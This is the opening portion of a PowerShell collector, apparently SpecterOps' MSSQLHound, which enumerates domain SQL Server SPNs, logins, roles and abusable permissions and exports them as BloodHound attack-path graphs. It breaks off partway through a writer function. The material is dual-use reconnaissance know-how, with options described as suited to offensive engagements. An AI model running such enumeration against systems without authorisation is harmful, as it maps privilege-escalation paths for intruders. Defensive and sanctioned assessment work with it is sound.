<#
.SYNOPSIS
MSSQLHound: PowerShell collector for adding MSSQL attack paths to BloodHound with OpenGraph

.DESCRIPTION
Author: Chris Thompson (@_Mayyhem) at SpecterOps

Purpose:
    Collects BloodHound OpenGraph compatible data from one or more MSSQL servers into individual files, then zips them
        - Example: mssql-bloodhound-20250724-115610.zip
      
System Requirements:
    - PowerShell 4.0 or higher
    - Target is running SQL Server 2005 or higher

Minimum Permissions:
    Windows Level:
        - Active Directory domain context with line of sight to a domain controller
    MSSQL Server Level:
        - **CONNECT SQL** (default for new logins)
        - **VIEW ANY DATABASE** (default for new logins)

 Recommended Permissions:
    MSSQL Server Level:
    - **VIEW ANY DEFINITION** permission or ##MS_DefinitionReader## role membership (available in versions 2022+)
        - Needed to read server principals and their permissions
        - Without one of these permissions, there will be false negatives (invisible server principals)
    - **VIEW SERVER PERFORMANCE STATE** permission or ##MSS_ServerPerformanceStateReader## role membership (available in versions 2022+) or local Administrators group privileges on the target (fallback for WMI collection)
        - Only used for service account collection

   MSSQL Database Level:
    - **CONNECT ANY DATABASE** server permission (available in versions 2014+) or ##MS_DatabaseConnector## role membership (available in versions 2022+) or login maps to a database user with CONNECT on individual databases
        - Needed to read database principals and their permissions
    - Login maps to **msdb database user with db_datareader** role or with SELECT permission on:
        - msdb.dbo.sysproxies
        - msdb.dbo.sysproxylogin
        - msdb.dbo.sysproxysubsystem
        - msdb.dbo.syssubsystems
        - Only used for proxy account collection

.PARAMETER Help
Display usage information

.PARAMETER OutputFormat
 Supported values:
    - BloodHound (default):    OpenGraph implementation, outputs .zip containing .json files per server
    - BHGeneric:               (work in progress) OpenGraph implementation for use with BHOperator
    - BloodHound-customnodes:  Generate JSON for POST to custom-nodes API endpoint
    - BloodHound-customnode:   Generate JSON for DELETE on custom-nodes API endpoint

.PARAMETER ServerInstance
Specify a specific server instance to collect from

Supported values:
    - Null (default):   Query the domain for SPNs and collect from each server found
    - Name/FQDN:        <host>
    - Instance:         <host>:<port|instance_name>
    - SPN:              <service class>/<host>:<port|instance_name>

.PARAMETER ServerListFile
Specify the path to a file containing multiple server instances to collect from in the ServerInstance formats above

.PARAMETER ServerList
Specify a comma-separated list of server instances to collect from in the ServerInstance formats above

.PARAMETER TempDir
Specify the path to a temporary directory where .json files will be stored before being zipped (default: new directory created with "[System.IO.Path]::GetTempPath()")

.PARAMETER ZipDir
Specify the path to a directory where the final .zip file will be stored (default: current directory)

.PARAMETER MemoryThresholdPercent
Stop execution when memory consumption exceeds this threshold (default: 90)

.PARAMETER Credential
Specify a PSCredential object to connect to the remote server(s):
    $cred = Get-Credential

.PARAMETER UserID
Specify a login to connect to the remote server(s)

.PARAMETER SecureString
Specify a SecureString object for the login used to connect to the remote server(s):
    $secureString = ConvertTo-SecureString "MyPassword123!" -AsPlainText -Force
    $secureString = Read-Host "Enter password:" -AsSecureString

.PARAMETER Password
Specify a password for the login used to connect to the remote server(s)

.PARAMETER Domain
Specify a domain to use for name and SID resolution

.PARAMETER DomainEnumOnly
Switch/Flag:
    - On: If SPNs are found, don’t try and perform a full MSSQL collection against each server
    - Off (default): If SPNs are found, try and perform a full MSSQL collection against each server

.PARAMETER IncludeNontraversableEdges
Switch/Flag:
    - On: Collect both traversable and non-traversable edges
    - Off (default): Collect only traversable edges (good for offensive engagements until Pathfinding supports OpenGraph edges)

.PARAMETER MakeInterestingEdgesTraversable
Switch/Flag:
    - On: Make the following edges traversable (useful for offensive engagements but prone to false positive edges that may not be abusable):
        - MSSQL_HasDBScopedCred
        - MSSQL_HasMappedCred
        - MSSQL_HasProxyCred
        - MSSQL_IsTrustedBy
        - MSSQL_LinkedTo
        - MSSQL_ServiceAccountFor
    - Off (default): The edges above are non-traversable

.PARAMETER CollectFromLinkedServers
Switch/Flag:
    - On: If linked servers are found, don’t try and perform a full MSSQL collection against each server
    - Off (default): If linked servers are found, try and perform a full MSSQL collection against each server

.PARAMETER InstallADModule
Switch/Flag:
    - On: Try to install the ActiveDirectory module for PowerShell if it is not already installed
    - Off (default): Do not try to install the ActiveDirectory module for PowerShell if it is not already installed.  Rely on DirectoryServices, ADSISearcher, DirectorySearcher, and NTAccount.Translate() for object resolution.

.PARAMETER LinkedServerTimeout
Give up enumerating linked servers after X seconds

.PARAMETER FileSizeLimit
Stop enumeration after all collected files exceed this size on disk

Supported values:
    - *MB
    - *GB

.PARAMETER FileSizeUpdateInterval
Receive periodic size updates as files are being written for each server (in seconds)

.PARAMETER Version
Switch/Flag:
    - On: Display version information and exit

.EXAMPLE
.\MSSQLHound.ps1 -Help
Display help text

.EXAMPLE
.\MSSQLHound.ps1 -DomainEnumOnly
Enumerate SPNS in the Active Directory domain for current logon context, skipping collection from individual servers

.EXAMPLE
.\MSSQLHound.ps1 -ServerInstance
Collect data from the specified server and from any linked servers discovered

.EXAMPLE
.\MSSQLHound.ps1 -ServerInstance -CollectFromLinkedServers
Collect data from the specified server and collect from any linked servers discovered

.EXAMPLE
.\MSSQLHound.ps1
Enumerate SPNS in the Active Directory domain for current logon context, then collect data from each server with an SPN

.EXAMPLE
.\MSSQLHound.ps1 -MakeInterestingEdgesTraversable
Enumerate SPNS in the Active Directory domain for current logon context, then collect data from each server with an SPN, labelling questionably valid attack path edges traversable

.EXAMPLE
.\MSSQLHound.ps1 -IncludeNontraversableEdges
Enumerate SPNS in the Active Directory domain for current logon context, then collect data from each server with an SPN, including non-traversable edges

.LINK
https://github.com/SpecterOps/MSSQLHound

#>

[CmdletBinding()]
param(

    [switch]$Help,

    # Supported output formats
    #    - BloodHound:              OpenGraph implementation
    #    - BHGeneric:               OpenGraph implementation for use with BHOperator
    #    - BloodHound-customnodes:  Generate JSON for POST to custom-nodes API endpoint
    #    - BloodHound-customnode:   Generate JSON for DELETE on custom-nodes API endpoint
    [ValidateSet("BloodHound", "BloodHound-customnodes", "BloodHound-customnode", "BHGeneric")]
    [string]$OutputFormat = "BloodHound",

    # Supported ServerInstance formats
    #   - Null:         Query the domain for SPNs and collect from each server found
    #   - Name/FQDN:    <host>
    #   - Instance:     <host>:<port|instance_name>
    #   - SPN:          <service class>/<host>:<port|instance_name>
    [string]$ServerInstance,#="ps1-db.mayyhem.com",

    # File containing list of servers (one per line)
    [string]$ServerListFile,

    # Comma-separated list of servers
    [string]$ServerList,

    # Validate that the temp directory exists
    [ValidateScript({
        if ([string]::IsNullOrEmpty($_) -or (Test-Path $_)) {
            $true
        } else {
            throw "The specified directory does not exist: $_"
        }
    })]
    [string]$TempDir = $null,

    # Validate that the output directory exists
    [ValidateScript({
        if ([string]::IsNullOrEmpty($_) -or (Test-Path $_)) {
            $true
        } else {
            throw "The specified directory does not exist: $_"
        }
    })]
    [string]$ZipDir = $null,

    # Warn user when memory consumption exceeds this threshold
    [int]$MemoryThresholdPercent = 90,
    
    # Specify SQL login credentials - useful when domain authentication isn't working
    [PSCredential]$Credential,
    [string]$UserID,#="lowpriv",
    [SecureString]$SecureString,
    [string]$Password,#="password",

    # Specify domain in DOMAIN.COM format
    [string]$Domain = $env:USERDNSDOMAIN,
    
    [switch]$IncludeNontraversableEdges,

    # Make the following edges traversable (prone to false positive edges that may not be abusable):
    #   - MSSQL_HasDBScopedCred
    #   - MSSQL_HasMappedCred
    #   - MSSQL_HasProxyCred
    #   - MSSQL_IsTrustedBy
    #   - MSSQL_LinkedTo
    #   - MSSQL_ServiceAccountFor
    [switch]$MakeInterestingEdgesTraversable=$true,

    [switch]$CollectFromLinkedServers,#=$true,

    [switch]$DomainEnumOnly,#=$true,

    [switch]$InstallADModule,#=$true,

    [int]$LinkedServerTimeout = 300, # seconds

    # File size limit to stop enumeration (e.g., "1GB", "500MB", "2.5GB")
    [string]$FileSizeLimit = "1GB",

    # Interval in seconds for periodic file size updates (0 to disable)
    [int]$FileSizeUpdateInterval = 5,

    [switch]$Version
)

# Display help text
if ($Help) {
    Get-Help $MyInvocation.MyCommand.Path -Detailed
    return
}

# Script version information
$script:ScriptVersion = "1.0"
$script:ScriptName = "MSSQLHound"
$script:Domain = $Domain

# Handle version request
if ($Version) {
    Write-Host "$script:ScriptName version $script:ScriptVersion" -ForegroundColor Green
    return
}

if ($OutputFormat -eq "BloodHound-customnodes") {
    $customNodes = @{
        "custom_types" = @{
            "MSSQL_Database" = @{
                "icon" = @{
                    "color" = "#f54242"
                    "name" = "database"
                    "type" = "font-awesome"
                }
            }
            "MSSQL_ServerRole" = @{
                "icon" = @{
                    "color" = "#6942f5"
                    "name" = "users-gear"
                    "type" = "font-awesome"
                }
            }
            "MSSQL_Login" = @{
                "icon" = @{
                    "color" = "#dd42f5"
                    "name" = "user-gear"
                    "type" = "font-awesome"
                }
            }
            "MSSQL_Server" = @{
                "icon" = @{
                    "color" = "#42b9f5"
                    "name" = "server"
                    "type" = "font-awesome"
                }
            }
            "MSSQL_DatabaseRole" = @{
                "icon" = @{
                    "color" = "#f5a142"
                    "name" = "users"
                    "type" = "font-awesome"
                }
            }
            "MSSQL_DatabaseUser" = @{
                "icon" = @{
                    "color" = "#f5ef42"
                    "name" = "user"
                    "type" = "font-awesome"
                }
            }
            "MSSQL_ApplicationRole" = @{
                "icon" = @{
                    "color" = "#6ff542"
                    "name" = "robot"
                    "type" = "font-awesome"
                }
            }
        }
    }
    
    # Output the custom nodes JSON and exit
    $customNodes | ConvertTo-Json -Depth 10 
    $customNodes | ConvertTo-Json -Depth 10 | clip.exe

    # Output to clipboard
    Write-Host "All custom node types JSON copied to clipboard!" -ForegroundColor Green
    Write-Host "POST to /api/v2/custom-nodes (e.g., in API Explorer)" -ForegroundColor Green
    return
}

elseif ($OutputFormat -eq 'BloodHound-customnode') {

    # Output each custom node type as individual JSON
    Write-Host "Each JSON snippet below can be sent individually to the API to delete the custom node type:`n" -ForegroundColor Cyan
    Write-Output '--- MSSQL_Database ---'
    @{
        "custom_types" = @{
            "MSSQL_Database" = @{
                "icon" = @{
                    "color" = "#f54242"
                    "name" = "database"
                    "type" = "font-awesome"
                }
            }
        }
    } | ConvertTo-Json -Depth 10
    
    Write-Output "`n--- MSSQL_ServerRole ---"
    @{
        "custom_types" = @{
            "MSSQL_ServerRole" = @{
                "icon" = @{
                    "color" = "#6942f5"
                    "name" = "users-gear"
                    "type" = "font-awesome"
                }
            }
        }
    } | ConvertTo-Json -Depth 10
    
    Write-Output "`n--- MSSQL_Login ---"
    @{
        "custom_types" = @{
            "MSSQL_Login" = @{
                "icon" = @{
                    "color" = "#dd42f5"
                    "name" = "user-gear"
                    "type" = "font-awesome"
                }
            }
        }
    } | ConvertTo-Json -Depth 10
    
    Write-Output "`n--- MSSQL_Server ---"
    @{
        "custom_types" = @{
            "MSSQL_Server" = @{
                "icon" = @{
                    "color" = "#42b9f5"
                    "name" = "server"
                    "type" = "font-awesome"
                }
            }
        }
    } | ConvertTo-Json -Depth 10
    
    Write-Output "`n--- MSSQL_ApplicationRole ---"
    @{
        "custom_types" = @{
            "MSSQL_ApplicationRole" = @{
                "icon" = @{
                    "color" = "#6ff542"
                    "name" = "robot"
                    "type" = "font-awesome"
                }
            }
        }
    } | ConvertTo-Json -Depth 10
    
    Write-Output "`n--- MSSQL_DatabaseRole ---"
    @{
        "custom_types" = @{
            "MSSQL_DatabaseRole" = @{
                "icon" = @{
                    "color" = "#f5a142"
                    "name" = "users"
                    "type" = "font-awesome"
                }
            }
        }
    } | ConvertTo-Json -Depth 10
    
    Write-Output "`n--- MSSQL_DatabaseUser ---"
    @{
        "custom_types" = @{
            "MSSQL_DatabaseUser" = @{
                "icon" = @{
                    "color" = "#f5ef42"
                    "name" = "user"
                    "type" = "font-awesome"
                }
            }
        }
    } | ConvertTo-Json -Depth 10
    
    Write-Host "POST to /api/v2/custom-nodes (e.g., in API Explorer)" -ForegroundColor Green
    return
}

if (-not $script:Domain) {
    try {
        Write-Warning "No domain provided and could not find `$env:USERDNSDOMAIN, trying computer's domain"
        $script:Domain = (Get-CimInstance Win32_ComputerSystem).Domain
        Write-Host "Using computer's domain: $script:Domain"
    } catch {
        Write-Warning "Error getting computer's domain, using `$env:USERDOMAIN: $_"
        $script:Domain = $env:USERDOMAIN
    }
}

# Imports

# Default serializer ConvertFrom-JSON was hitting maximum size limits, so using this one instead
Add-Type -AssemblyName System.Web.Extensions
Add-Type -AssemblyName System.Data


# Add Active Directory module if needed
if (-not (Get-Module -Name ActiveDirectory)) {
    if (Get-Module -ListAvailable -Name ActiveDirectory) {
        Import-Module ActiveDirectory
    }
}

if (-not (Get-Module -Name ActiveDirectory) -and $InstallADModule) {
    Write-Host "Active Directory module not found. Attempting to install RSAT..." -ForegroundColor Yellow
    
    # Determine OS type
    $osInfo = Get-CimInstance Win32_OperatingSystem
    $isServer = $osInfo.ProductType -gt 1  # 2 = Domain Controller, 3 = Server
    $isClient = $osInfo.ProductType -eq 1  # 1 = Workstation (Windows 10/11)
    
    $installSuccess = $false
    
    if ($isServer) {
        Write-Host "Detected Windows Server - trying server installation methods"
        
        # Method 1: Standard Install-WindowsFeature
        if (-not $installSuccess) {
            try {
                Install-WindowsFeature RSAT-AD-PowerShell -Restart:$false -ErrorAction Stop
                $installSuccess = $true
                Write-Host "Successfully installed RSAT using Install-WindowsFeature" -ForegroundColor Green
            } catch {
                Write-Host "Install-WindowsFeature failed: $_"
            }
        }
        
        # Method 2: Import ServerManager first
        if (-not $installSuccess) {
            try {
                Import-Module ServerManager -ErrorAction Stop
                Install-WindowsFeature RSAT-AD-PowerShell -Restart:$false -ErrorAction Stop
                $installSuccess = $true
                Write-Host "Successfully installed RSAT using ServerManager module" -ForegroundColor Green
            } catch {
                Write-Host "ServerManager method failed: $_"
            }
        }
        
        # Method 3: Try Add-WindowsFeature (older servers)
        if (-not $installSuccess) {
            try {
                Add-WindowsFeature RSAT-AD-PowerShell -Restart:$false -ErrorAction Stop
                $installSuccess = $true
                Write-Host "Successfully installed RSAT using Add-WindowsFeature" -ForegroundColor Green
            } catch {
                Write-Host "Add-WindowsFeature failed: $_"
            }
        }
    }
    
    if ($isClient) {
        Write-Host "Detected Windows Client - trying client installation methods"
        
        # Method 1: Enable Windows Optional Feature (Windows 10/11)
        if (-not $installSuccess) {
            try {
                Enable-WindowsOptionalFeature -Online -FeatureName RSATClient-Roles-AD-Powershell -All -NoRestart -ErrorAction Stop
                $installSuccess = $true
                Write-Host "Successfully installed RSAT using Windows Optional Features" -ForegroundColor Green
            } catch {
                Write-Host "Windows Optional Feature method failed: $_"
            }
        }
        
        # Method 2: Try alternative feature name
        if (-not $installSuccess) {
            try {
                Enable-WindowsOptionalFeature -Online -FeatureName "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0" -NoRestart -ErrorAction Stop
                $installSuccess = $true
                Write-Host "Successfully installed RSAT using alternative feature name" -ForegroundColor Green
            } catch {
                Write-Host "Alternative feature name failed: $_"
            }
        }
        
        # Method 3: DISM command
        if (-not $installSuccess) {
            try {
                $dismResult = & dism /online /enable-feature /featurename:RSATClient-Roles-AD-Powershell /all /norestart 2>&1
                if ($LASTEXITCODE -eq 0) {
                    $installSuccess = $true
                    Write-Host "Successfully installed RSAT using DISM" -ForegroundColor Green
                } else {
                    Write-Host "DISM failed with exit code: $LASTEXITCODE"
                }
            } catch {
                Write-Host "DISM method failed: $_"
            }
        }
    }
    
    # Try to import the module after installation attempts
    if ($installSuccess) {
        Start-Sleep -Seconds 2  # Give it a moment to register
        try {
            Import-Module ActiveDirectory -ErrorAction Stop
            Write-Host "Active Directory module successfully imported" -ForegroundColor Green
        } catch {
            Write-Warning "RSAT appears to be installed but module import failed: $_"
        }
    }
}

# Final check and warning
if (-not (Get-Module -Name ActiveDirectory)) {
    Write-Warning "Could not find or install Active Directory module"
    # Offer fallback methods
    Write-Host "Will attempt to use .NET DirectoryServices as fallback for AD operations" -ForegroundColor Yellow
    
    # Load .NET DirectoryServices as fallback
    try {
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement
        Add-Type -AssemblyName System.DirectoryServices
        $script:UseNetFallback = $true
        Write-Host "Using .NET DirectoryServices as fallback" -ForegroundColor Green
    } catch {
        Write-Warning "Could not load .NET DirectoryServices fallback: $_"
        $script:UseNetFallback = $false
    }
} else {
    Write-Host "Active Directory module is available and loaded" -ForegroundColor Green
    $script:UseNetFallback = $false
}

# Clear any existing script variables from previous runs
Remove-Variable -Name bloodhoundOutput -Scope Script -ErrorAction SilentlyContinue
Remove-Variable -Name nodesOutput -Scope Script -ErrorAction SilentlyContinue
Remove-Variable -Name edgesOutput -Scope Script -ErrorAction SilentlyContinue
Remove-Variable -Name serversToProcess -Scope Script -ErrorAction SilentlyContinue
Remove-Variable -Name linkedServersToProcess -Scope Script -ErrorAction SilentlyContinue
Remove-Variable -Name DomainValidationCache -Scope Script -ErrorAction SilentlyContinue
Remove-Variable -Name DomainResolutionCache -Scope Script -ErrorAction SilentlyContinue
Remove-Variable -Name ValidatedDomainsCache -Scope Script -ErrorAction SilentlyContinue

# Initialize an object for servers specified by user or discovered during domain enumeration
$script:serversToProcess = @{}

# Initialize array for linked servers discovered during processing
$script:linkedServersToProcess = @()

# Name and SID resolution
$script:DomainTestCache = @{}
$script:DomainValidationCache = @{}
$script:DomainResolutionCache = @{}
$script:ValidatedDomainsCache = @{}

# Initialize output structures based on format
if ($OutputFormat -eq "BloodHound") {
    $script:bloodhoundOutput = @{
        graph = @{
            nodes = @()
            edges = @()
        }
    }
    # Track all output files for cumulative size tracking
    $script:OutputFiles = @()

    # Set output directory
    if (-not $TempDir) {
        # Create temporary directory for output files
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $tempPath = [System.IO.Path]::GetTempPath()
        $TempDirectory = Join-Path $tempPath "mssql-bloodhound-$timestamp"
        New-Item -ItemType Directory -Path $TempDirectory -Force | Out-Null
    } else {
        $TempDirectory = $TempDir
    }
    Write-Host "Temporary output directory: $TempDirectory" -ForegroundColor Cyan

    # Initialize file size monitoring variables
    $script:FileSizeLimit = $FileSizeLimit
    $script:LastFileSizeCheck = Get-Date
    $script:FileSizeCheckInterval = $FileSizeUpdateInterval

} elseif ($OutputFormat -eq "BHGeneric") {
    $script:bloodhoundOutput = ""
    $script:nodesOutput = @()
    $script:edgesOutput = @()
    
}

# Server and Database level permissions to map
$ServerPermissionsToMap = @(
    "ALTER",
    "ALTER ANY LOGIN",
    "ALTER ANY SERVER ROLE",
    "CONTROL",
    "CONNECT SQL",
    "CONNECT ANY DATABASE",
    "CONTROL SERVER",
    "IMPERSONATE",
    "IMPERSONATE ANY LOGIN",
    "TAKE OWNERSHIP"
)

$DatabasePermissionsToMap = @(
    "ALTER",
    "ALTER ANY APPLICATION ROLE",
    "ALTER ANY ROLE",
    "CONNECT",
    "CONTROL",
    "IMPERSONATE",
    "TAKE OWNERSHIP"
)

# Comprehensive predefined abusable (or non-traversable) permissions for SQL Server fixed server roles
$fixedServerRolePermissions = @{
    # sysadmin implicitly has all permissions, but CONTROL SERVER trumps all, so the rest don't need to be listed
    "sysadmin" = @(
        #"ALTER ANY LOGIN",
        #"ALTER ANY SERVER ROLE",
        "CONTROL SERVER"
        #"IMPERSONATE ANY LOGIN"
    )
    
    # securityadmin can manage security-related aspects and grant ANY permission to any login
    "securityadmin" = @(
        "ALTER ANY LOGIN"
    )

    # Introduced in MSSQL 2022, like securityadmin but can't grant any permission to any login
    "##MS_LoginManager##" = @(
        "ALTER ANY LOGIN"
    )

    # Introduced in MSSQL 2022, allows server principal CONNECT permission on all databases without a mapping to a database user
    "##MS_DatabaseConnector##" = @(
        "CONNECT ANY DATABASE"
    )
    
    # public has minimal permissions
    "public" = @()
}

# Comprehensive predefined permissions for SQL Server fixed database roles
$fixedDatabaseRolePermissions = @{
    # db_owner has all permissions, CONTROL encompasses them
    "db_owner" = @(
        #"ALTER ANY APPLICATION ROLE",
        #"ALTER ANY ROLE",
        "CONTROL"
    )
    
    # db_securityadmin can manage roles and users
    "db_securityadmin" = @(
        "ALTER ANY APPLICATION ROLE",
        "ALTER ANY ROLE"
    )
    
    # db_accessadmin can manage database access
    "db_accessadmin" = @(
    )
    
    # db_backupoperator can back up the database
    "db_backupoperator" = @(
    )
    
    # db_ddladmin can run DDL commands
    "db_ddladmin" = @(
    )
    
    # db_datawriter can modify data
    "db_datawriter" = @(
    )
    
    # db_datareader can read all data
    "db_datareader" = @(
    )
    
    # db_denydatawriter cannot modify data
    "db_denydatawriter" = @(
        # DELETE, INSERT, and UPDATE are explicitly denied
    )
    
    # db_denydatareader cannot read data
    "db_denydatareader" = @(
        # SELECT is explicitly denied
    )
    
    # public has minimal permissions
    "public" = @(
        #"CONNECT"
    )
}

# Helper function to display current file size
function Show-CurrentFileSize {
    param(
        [Parameter(Mandatory=$true)]
        [PSObject]$WriterObj,
        [string]$Context = ""
    )
    
    try {
        # Calculate cumulative size of completed files only
        $cumulativeSize = 0
        $fileCount = $script:OutputFiles.Count
        
        foreach ($file in $script:OutputFiles) {
            if (Test-Path $file) {
                $fileInfo = Get-Item $file
                $cumulativeSize += $fileInfo.Length
            }
        }
        
        # Get current file size (not included in cumulative)
        $currentFileSize = 0
        if (Test-Path $WriterObj.FilePath) {
            $fileInfo = Get-Item $WriterObj.FilePath
            $currentFileSize = $fileInfo.Length
            
            # Format current file size for display
            $currentSizeDisplay = if ($currentFileSize -ge 1GB) {
                "$([math]::Round($currentFileSize/1GB, 2)) GB"
            } elseif ($currentFileSize -ge 1MB) {
                "$([math]::Round($currentFileSize/1MB, 2)) MB"
            } elseif ($currentFileSize -ge 1KB) {
                "$([math]::Round($currentFileSize/1KB, 2)) KB"
            } else {
                "$currentFileSize bytes"
            }
        }
        
        # Format cumulative size (completed files only)
        $sizeDisplay = if ($cumulativeSize -ge 1GB) {
            "$([math]::Round($cumulativeSize/1GB, 2)) GB"
        } elseif ($cumulativeSize -ge 1MB) {
            "$([math]::Round($cumulativeSize/1MB, 2)) MB"
        } elseif ($cumulativeSize -ge 1KB) {
            "$([math]::Round($cumulativeSize/1KB, 2)) KB"
        } else {
            "$cumulativeSize bytes"
        }
        
        $contextText = if ($Context) { " ($Context)" } else { "" }
        
        # Show current file and cumulative of completed files
        if ($fileCount -gt 0) {
            Write-Host "Current file size: $currentSizeDisplay`nCumulative file size: $sizeDisplay across $fileCount files$contextText" -ForegroundColor Cyan
        } else {
            Write-Host "Current file size: $currentSizeDisplay" -ForegroundColor Cyan
        }
    }
    catch {
        # Silently continue if there's an error checking file size
    }
}

# Helper function to check if enough time has passed for periodic update
function Test-ShouldShowPeriodicUpdate {
    $currentTime = Get-Date
    $timeSinceLastCheck = ($currentTime - $script:LastFileSizeCheck).TotalSeconds
    
    if ($timeSinceLastCheck -ge $script:FileSizeCheckInterval) {
        $script:LastFileSizeCheck = $currentTime
        return $true
    }
    return $false
}

# Helper function to check file size
function Test-FileSizeLimit {
    param(
        [Parameter(Mandatory=$true)]
        [PSObject]$WriterObj,
        [string]$SizeLimitString = "1GB"
    )
    
    # If we're already stopping, just return true without additional warnings
    if ($script:stopProcessing) {
        return $true
    }
    
    try {
        # Parse the size limit string
        $SizeLimitBytes = 0
        if ($SizeLimitString -match '^(\d+\.?\d*)\s*(GB|MB|KB|B)?$') {
            $value = [double]$matches[1]
            $unit = $matches[2]
            
            switch ($unit) {
                "GB" { $SizeLimitBytes = $value * 1GB }
                "MB" { $SizeLimitBytes = $value * 1MB }
                "KB" { $SizeLimitBytes = $value * 1KB }
                "B"  { $SizeLimitBytes = $value }
                default { $SizeLimitBytes = $value * 1GB } # Default to GB if no unit
            }
        } else {
            Write-Warning "Invalid file size limit format: '$SizeLimitString'. Using default 1GB."
            $SizeLimitBytes = 1GB
        }
        
        # Calculate cumulative size of all completed files
        $cumulativeSize = 0
        foreach ($file in $script:OutputFiles) {
            if (Test-Path $file) {
                $fileInfo = Get-Item $file
                $cumulativeSize += $fileInfo.Length
            }
        }
        
        # Add current file being written
        if ($WriterObj.FilePath -and (Test-Path $WriterObj.FilePath)) {
            $currentFileInfo = Get-Item $WriterObj.FilePath
            $cumulativeSize += $currentFileInfo.Length
        }
        
        if ($cumulativeSize -ge $SizeLimitBytes) {
            $totalFiles = $script:OutputFiles.Count
            if ($WriterObj.FilePath -and (Test-Path $WriterObj.FilePath)) {
                $totalFiles++ # Include current file in count
            }
            Write-Warning "Cumulative file size limit reached: $([math]::Round($cumulativeSize/1MB, 2)) MB >= $SizeLimitString"
            Write-Warning "Total files: $totalFiles ($(($script:OutputFiles.Count)) completed + 1 in progress)"
            return $true
        }
        
        return $false
    }
    catch {
        Write-Warning "Error checking file size: $_"
        return $false
    }
}

# Memory monitoring function
function Test-MemoryUsage {
    param(
        [int]$Threshold = 80
    )
    
    $os = Get-CimInstance Win32_OperatingSystem
    $memoryUsedGB = ($os.TotalVisibleMemorySize - $os.FreePhysicalMemory) / 1MB
    $totalMemoryGB = $os.TotalVisibleMemorySize / 1MB
    $percentUsed = ($memoryUsedGB / $totalMemoryGB) * 100
    
    Write-Host "Memory usage: $([math]::Round($percentUsed, 2))% ($([math]::Round($memoryUsedGB, 2))GB / $([math]::Round($totalMemoryGB, 2))GB)" -ForegroundColor Cyan
    
    if ($percentUsed -gt $Threshold) {
        Write-Warning "Memory usage is at $([math]::Round($percentUsed, 2))%. Threshold: $Threshold%"
        return $false
    }
    return $true
}

# Create constructor functions for streaming writers
function New-BaseStreamingWriter {
    param(
        [string]$FilePath,
        [string]$WriterType = "Base"
    )
    
    # Store the absolute path - ensure it's relative to current directory
    if ([System.IO.Path]::IsPathRooted($FilePath)) {
        $absolutePath = $FilePath
    } else {
        # Use PowerShell's current location for relative paths
        $absolutePath = Join-Path (Get-Location).Path $FilePath
    }

    try {
        # Ensure directory exists
        $directory = [System.IO.Path]::GetDirectoryName($absolutePath)
        if ($directory -and -not [System.IO.Directory]::Exists($directory)) {
            [System.IO.Directory]::CreateDirectory($directory) | Out-Null
        }
        
        # Create the file with explicit encoding
        $writer = New-Object System.IO.StreamWriter($absolutePath, $false, [System.Text.Encoding]::UTF8)
        $writer.AutoFlush = $true
        
        # Verify file was created
        if (Test-Path $absolutePath) {
            Write-Host "Created output file: $absolutePath" -ForegroundColor Cyan
        } else {
            throw "File was not created at: $absolutePath"
        }
        
        # Return writer object with metadata
        $writerObj = New-Object PSObject -Property @{
            Writer = $writer
            FilePath = $absolutePath
            ItemCount = 0
            WriterType = $WriterType
        }
        
        return $writerObj
    }
    catch {
        Write-Error "Failed to create output file '$absolutePath': $_"
        throw
    }
}

function Close-StreamingWriter {
    param(
        [Parameter(Mandatory=$true)]
        [PSObject]$WriterObj
    )
    
    try {
        if ($WriterObj.Writer) {
            $WriterObj.Writer.Flush()
            $WriterObj.Writer.Close()
            $WriterObj.Writer.Dispose()
            $WriterObj.Writer = $null
            
            # Small delay to ensure file system has caught up
            Start-Sleep -Milliseconds 100
            
            # Verify file exists and has content
            if (Test-Path $WriterObj.FilePath) {
                $fileInfo = Get-Item $WriterObj.FilePath
                Write-Host "Output written to $($WriterObj.FilePath)" -ForegroundColor Green
                # Convert bytes to appropriate unit
                $fileSize = $fileInfo.Length
                if ($fileSize -ge 1MB) {
                    Write-Host "File size: $([math]::Round($fileSize/1MB, 2)) MB" -ForegroundColor Cyan
                } elseif ($fileSize -ge 1KB) {
                    Write-Host "File size: $([math]::Round($fileSize/1KB, 2)) KB" -ForegroundColor Cyan
                } else {
                    Write-Host "File size: $fileSize bytes" -ForegroundColor Cyan
                }                
            } else {
                Write-Error "File was not found after closing: $($WriterObj.FilePath)"
            }
        }
    }
    catch {
        Write-Error "Error closing file: $_"
        Write-Error $_.Exception.StackTrace
    }
}

# JSON Writer Functions
function New-StreamingJsonWriter {
    param(
        [string]$FilePath
    )
    
    $writerObj = New-BaseStreamingWriter -FilePath $FilePath -WriterType "JSON"
    
    # Add JSON-specific properties
    $writerObj | Add-Member -MemberType NoteProperty -Name "FirstItem" -Value $true
    
    # Start JSON structure
    $writerObj.Writer.WriteLine('{')
    $writerObj.Writer.WriteLine('  "MSSQLServerInstances": [')
    
    return $writerObj
}

function Write-JsonServer {
    param(
        [Parameter(Mandatory=$true)]
        [PSObject]$WriterObj,
        
        [Parameter(Mandatory=$true)]
        [PSObject]$Server
    )

    # Skip if we're already stopping
    if ($script:stopProcessing) { return }

    # Check file size limit
    if (Test-FileSizeLimit -WriterObj $WriterObj -SizeLimitString $script:FileSizeLimit) {
        $script:stopProcessing = $true
        return
    }

    # Show periodic file size update
    if (Test-ShouldShowPeriodicUpdate) {
        Show-CurrentFileSize -WriterObj $WriterObj
    }    
        
    if (-not $WriterObj.FirstItem) {
        $WriterObj.Writer.WriteLine(',')
    }
    $WriterObj.FirstItem = $false
    $WriterObj.ItemCount++
    
    # Convert to JSON with proper formatting
    $json = $Server | ConvertTo-Json -Depth 10
    
    # Indent the JSON for the array
    $indentedJson = $json -split "`n" | ForEach-Object { "    $_" }
    $WriterObj.Writer.Write(($indentedJson -join "`n"))
    $WriterObj.Writer.Flush()
}

function Close-JsonWriter {
    param(
        [Parameter(Mandatory=$true)]
        [PSObject]$WriterObj
    )
    
    $WriterObj.Writer.WriteLine('')  # New line after last item
    $WriterObj.Writer.WriteLine('  ]')
    $WriterObj.Writer.WriteLine('}')
    
    Close-StreamingWriter -WriterObj $WriterObj
}

# BloodHound Writer Functions
function New-StreamingBloodHoundWriter {
    param(
        [string]$FilePath
    )
    
    $writerObj = New-BaseStreamingWriter -FilePath $FilePath -WriterType "BloodHound"
    
    # Add BloodHound-specific properties
    $writerObj | Add-Member -MemberType NoteProperty -Name "FirstNode" -Value $true
    $writerObj | Add-Member -MemberType NoteProperty -Name "FirstEdge" -Value $true
    $writerObj | Add-Member -MemberType NoteProperty -Name "NodeCount" -Value 0
